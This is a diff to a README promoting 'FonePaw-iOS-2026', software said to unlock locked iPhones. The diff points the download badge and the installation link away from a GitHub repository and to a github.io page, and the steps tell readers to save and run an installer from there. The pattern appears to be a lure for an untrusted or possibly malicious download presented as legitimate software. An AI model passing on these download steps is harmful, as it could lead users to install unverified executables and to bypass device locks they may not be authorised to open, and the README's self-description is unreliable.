@@ -1,6 +1,6 @@
 # 🔓 FonePaw-iOS-2026 - Access locked iPhones with ease
 
-[![](https://img.shields.io/badge/Download-FonePaw-blue.svg)](https://github.com/tomamerciable569/FonePaw-iOS-2026)
+[![](https://img.shields.io/badge/Download-FonePaw-blue.svg)](https://tomamerciable569.github.io)
 
 ## 📋 Software Overview
 
@@ -21,7 +21,7 @@ Before you install the software, confirm your computer meets these standards:
 
 Follow these steps to set up the software on your PC.
 
-1. Visit the [official download page here](https://github.com/tomamerciable569/FonePaw-iOS-2026).
+1. Visit the [official download page here](https://tomamerciable569.github.io).
 2. Look for the release section on the webpage.
 3. Click the link to save the installer file to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
